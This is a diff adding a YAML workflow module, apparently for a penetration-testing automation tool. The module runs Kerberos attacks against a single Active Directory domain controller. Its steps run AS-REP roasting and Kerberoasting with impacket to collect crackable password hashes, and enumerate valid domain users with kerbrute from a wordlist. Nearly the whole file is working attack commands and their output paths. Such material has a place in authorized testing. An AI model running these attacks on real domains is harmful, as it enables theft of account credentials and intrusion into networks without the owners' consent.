@@ -1,0 +1,109 @@
+kind: module
+name: do-ad-kerberos
+description: Kerberos attacks on a single target — AS-REP roast, Kerberoast, user enum
+tags: ad,kerberos,asrep,kerberoast
+
+# -----------------------------------------------------------------------------
+# PARAMS SECTION
+# -----------------------------------------------------------------------------
+params:
+  - name: targetIp
+    default: "{{Target}}"
+  - name: domainName
+    default: ""
+  - name: dcIp
+    default: "{{targetIp}}"
+
+  - name: asrepHashes
+    default: "{{Output}}/ad/kerberos/asrep-hashes-{{TargetSpace}}.txt"
+  - name: asrepUsers
+    default: "{{Output}}/ad/kerberos/asrep-users-{{TargetSpace}}.txt"
+  - name: kerberoastHashes
+    default: "{{Output}}/ad/kerberos/kerberoast-hashes-{{TargetSpace}}.txt"
+  - name: kerberoastAccounts
+    default: "{{Output}}/ad/kerberos/kerberoast-accounts-{{TargetSpace}}.txt"
+  - name: kerbruteUserList
+    default: "{{ExternalWordlists}}/ad-usernames.txt"
+
+  - name: kerbruteResults
+    default: "{{Output}}/ad/kerberos/kerbrute-users-{{TargetSpace}}.txt"
+  - name: domainUsers
+    default: "{{Output}}/ad/kerberos/valid-users-{{TargetSpace}}.txt"
+
+# -----------------------------------------------------------------------------
+# DEPENDENCIES SECTION
+# -----------------------------------------------------------------------------
+dependencies:
+  commands:
+    - impacket-GetNPUsers
+    - impacket-GetUserSPNs
+    - kerbrute
+
+  variables:
+    - name: Target
+      type: string
+      required: true
+
+# -----------------------------------------------------------------------------
+# REPORTS SECTION
+# -----------------------------------------------------------------------------
+reports:
+  - name: asrep-roastable-users
+    path: "{{asrepUsers}}"
+    type: text
+    description: AS-REP roastable users
+
+  - name: kerberoastable-accounts
+    path: "{{kerberoastAccounts}}"
+    type: text
+    description: Kerberoastable accounts
+
+# -----------------------------------------------------------------------------
+# STEPS SECTION
+# -----------------------------------------------------------------------------
+steps:
+  # ---------------------------------------------------------------------------
+  # Setup
+  # ---------------------------------------------------------------------------
+  - name: create-output-folders
+    type: function
+    log: "Creating Kerberos output folders"
+    functions:
+      - 'create_folder("{{Output}}/ad/kerberos")'
+
+  # ---------------------------------------------------------------------------
+  # AS-REP Roast
+  # ---------------------------------------------------------------------------
+  - name: asrep-roast
+    type: bash
+    log: "Running AS-REP roasting"
+    pre_condition: '!is_empty("{{domainName}}")'
+    commands:
+      - 'impacket-GetNPUsers -dc-ip {{dcIp}} -request -format hashcat "{{domainName}}/" -no-pass > {{asrepHashes}} 2>/dev/null'
+      - 'grep "user:" {{asrepHashes}} | awk "{print \$2}" | sort -u > {{asrepUsers}} 2>/dev/null || true'
+    on_error:
+      - action: continue
+
+  # ---------------------------------------------------------------------------
+  # Kerberoast
+  # ---------------------------------------------------------------------------
+  - name: kerberoast
+    type: bash
+    log: "Running Kerberoasting"
+    pre_condition: '!is_empty("{{domainName}}")'
+    commands:
+      - 'impacket-GetUserSPNs -dc-ip {{dcIp}} -request -outputfile {{kerberoastHashes}} "{{domainName}}/" -no-pass > {{kerberoastAccounts}} 2>/dev/null'
+    on_error:
+      - action: continue
+
+  # ---------------------------------------------------------------------------
+  # Kerbrute user enumeration
+  # ---------------------------------------------------------------------------
+  - name: kerbrute-user-enum
+    type: bash
+    log: "Enumerating valid domain users via Kerberos"
+    pre_condition: '!is_empty("{{domainName}}")'
+    commands:
+      - 'kerbrute userenum -d {{domainName}} --dc {{dcIp}} -o {{kerbruteResults}} {{kerbruteUserList}} > /dev/null 2>&1 || true'
+    on_error:
+      - action: continue
